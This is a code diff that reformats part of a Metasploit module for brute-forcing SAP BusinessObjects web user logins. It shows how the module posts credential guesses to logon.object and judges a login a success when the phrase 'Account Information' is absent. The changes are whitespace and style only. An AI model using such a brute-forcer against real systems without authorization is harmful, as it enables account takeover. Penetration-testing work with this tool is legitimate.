@@ -11,33 +11,33 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'		   => 'SAP BusinessObjects Web User Bruteforcer',
+      'Name'	=> 'SAP BusinessObjects Web User Bruteforcer',
       'Description'	=> 'This module simply attempts to bruteforce SAP BusinessObjects users by using CmcApp.',
-      'References'  =>
-        [
-          # General
-          [ 'URL', 'http://spl0it.org/files/talks/source_barcelona10/Hacking%20SAP%20BusinessObjects.pdf' ]
-        ],
-      'Author'		 => [ 'Joshua Abraham <jabra[at]rapid7.com>' ],
-      'License'		=> MSF_LICENSE
+      'References' => [
+        # General
+        [ 'URL', 'http://spl0it.org/files/talks/source_barcelona10/Hacking%20SAP%20BusinessObjects.pdf' ]
+      ],
+      'Author'	=> [ 'Joshua Abraham <jabra[at]rapid7.com>' ],
+      'License'	=> MSF_LICENSE
     )
 
     register_options(
       [
         Opt::RPORT(6405),
-      ])
+      ]
+    )
     register_autofilter_ports([ 6405 ])
   end
 
   def run_host(ip)
     res = send_request_cgi({
-      'uri'	 => "/PlatformServices/service/app/logon.object",
-      'method'  => 'GET'
+      'uri'	=> "/PlatformServices/service/app/logon.object",
+      'method' => 'GET'
     }, 25)
     return if not res
 
     each_user_pass { |user, pass|
-      enum_user(user,pass)
+      enum_user(user, pass)
     }
   end
 
@@ -77,23 +77,23 @@ class MetasploitModule < Msf::Auxiliary
     data << '&authType=secEnterprise&backUrl=%2FApp%2Fhome.faces'
     begin
       res = send_request_cgi({
-        'uri'		  => '/PlatformServices/service/app/logon.object',
-        'data'		 => data,
-        'method'	   => 'POST',
-        'headers'	  =>
+        'uri'	=> '/PlatformServices/service/app/logon.object',
+        'data'	=> data,
+        'method'	=> 'POST',
+        'headers'	=>
               {
                 'Connection' => "keep-alive",
                 'Accept-Encoding' => "gzip,deflate",
               },
       }, 45)
       return :abort if (!res or (res and res.code != 200))
-      if(res.body.match(/Account Information/i))
+
+      if (res.body.match(/Account Information/i))
         success = false
       else
         success = true
         success
       end
-
     rescue ::Rex::ConnectionError
       vprint_error("[SAP BusinessObjects] Unable to attempt authentication")
       return :abort
